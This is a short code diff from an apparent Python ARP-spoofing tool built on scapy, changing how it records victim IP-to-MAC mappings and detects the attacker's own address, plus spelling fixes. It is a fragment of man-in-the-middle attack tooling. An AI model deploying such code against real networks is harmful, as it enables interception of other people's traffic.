@@ -50,22 +50,23 @@ def restore(victim_ip, source_ip):
     scapy.sendp(packet, count=4, verbose=False, iface=IFACE)
  
 
-def arp_prep(attacker_addr, manual, router, input_iface):
+def arp_prep(manual, router, input_iface):
     global victim_addresses, router_ip, IFACE, ATTACKER_IP, ATTACKER_MAC
     
     if manual is None:
-        print("No victim addresses given, quiting...")
+        print("No victim addresses given, quitting...")
         sys.exit()
     if router is None:
-        print("No router address given, quiting...")
+        print("No router address given, quitting...")
         sys.exit()
     
-    victim_addresses = manual
+    for ip in manual :
+        victim_addresses[ip] = get_mac(ip)
     router_ip = router
 
     IFACE = input_iface
-    ATTACKER_IP = attacker_addr[0]
-    ATTACKER_MAC = attacker_addr[1]
+    ATTACKER_IP = scapy.get_if_addr(IFACE)
+    ATTACKER_MAC = scapy.get_if_hwaddr(IFACE)
     print(ATTACKER_IP, ATTACKER_MAC)
 
 
